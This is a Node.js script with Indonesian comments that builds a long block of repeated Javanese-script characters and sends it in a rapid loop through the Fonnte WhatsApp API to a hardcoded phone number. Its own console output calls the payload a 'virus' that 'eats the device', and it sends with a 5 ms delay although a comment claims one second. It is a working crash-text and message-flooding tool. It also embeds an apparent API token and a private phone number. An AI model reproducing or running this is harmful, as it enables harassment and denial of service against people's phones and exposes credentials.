// safe_fonnte_repeat.js
// Uji pengiriman ke nomor sendiri via Fonnte API (hardcoded token & nomor — jangan share file ini)
// -------------------- PENTING --------------------
// File ini berisi API key/nomor yang sensitif. Hanya gunakan di lingkungan lokalmu.
// Setelah selesai testing: hapus token dari file ini dan/atau gunakan env var seperti dijelaskan sebelumnya.
// --------------------------------------------------

const axios = require('axios');

// Hardcoded credentials (dari input pengguna)
const API_KEY = '6qhJhHNa1Q6uFqUciuxp';
const TARGET_NUMBER = '6285652336578';

// ========== KONFIGURASI UJI ==============
const UNIT = 'ꦾꦾꦾꦾꦾꦾ ';             // simbol yang diulang
let REPEAT = 10000;              // jumlah pengulangan awal — MULAI KECIL
const MAX_REPEAT = 10000;       // batas aman total repeat (safety cap)
const MAX_CHARS_PER_MSG = 10000; // batas panjang pesan per request
const DELAY_MS = 5;         // jeda antar kirim (ms) — default 1 detik
const MAX_MSGS = 99999;           // maksimal pesan dikirim dalam 1 percobaan
// =========================================

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function buildRepeated(unit, count) {
  const safeCount = Math.min(count, MAX_REPEAT);
  return unit.repeat(safeCount);
}

function splitText(text, maxLen) {
  const chunks = [];
  for (let i = 0; i < text.length; i += maxLen) {
    chunks.push(text.slice(i, i + maxLen));
  }
  return chunks;
}

(async () => {
  console.log('🧱 Membangun virus...');
  // safety: jika REPEAT terlalu besar, batalkan dan minta konfirmasi
  if (REPEAT > MAX_REPEAT) {
    console.warn(`Requested REPEAT (${REPEAT}) lebih besar dari MAX_REPEAT (${MAX_REPEAT}). Dibatasi ke ${MAX_REPEAT}.`);
    REPEAT = MAX_REPEAT;
  }

  const text = buildRepeated(UNIT, REPEAT);
  const chunks = splitText(text, MAX_CHARS_PER_MSG);
  const sendCount = Math.min(chunks.length, MAX_MSGS);

  console.log(`📏 banyak total: ${text.length} virus_type`);
  console.log(`📦 Total infeksi awal: ${chunks.length} (infected ${sendCount} virus max)`);

  console.log('⚠️  Peringatan: virus akan memakan perangkat sedikit demi sedikit dan mohon untuk menjalankan di perangkat anda sendiri (bukan orang lain).');
  console.log('by:rifat');
  console.log('android:v10');
  console.log('type:virus');
  console.log('Ketik YES untuk menjalankan virus:');


  const input = await new Promise(r => {
    process.stdin.once('data', d => r(String(d).trim()));
  });

  if (input.toLowerCase() !== 'yes') {
    console.log('❌ Dibatalkan oleh pengguna.');
    process.exit(0);
  }

  console.log(`🚀 Mulai kirim ke ${TARGET_NUMBER}...\n`);

  for (let i = 0; i < sendCount; i++) {
    const msg = chunks[i];
    console.log(`📨 (${i + 1}/${sendCount}) Memakan (${msg.length} data)...`);
    try {
      const res = await axios.post('https://api.fonnte.com/send', {
        target: TARGET_NUMBER,
        message: msg
      }, {
        headers: { Authorization: API_KEY }
      });
      console.log(`✅ TERINFEKSI: ${JSON.stringify(res.data).slice(0,200)}${JSON.stringify(res.data).length>200 ? '…' : ''}`);
    } catch (err) {
      console.error(`❌ Gagal kirim pesan ke-${i + 1}:`, err.response?.data || err.message);
      break;
    }

    if (i < sendCount - 1) {
      console.log(`⏳ Tunggu ${DELAY_MS} ms sebelum sesi berikutnya...`);
      await sleep(DELAY_MS);
    }
  }

  console.log('\n✅ good consuming data 💉.');
})();
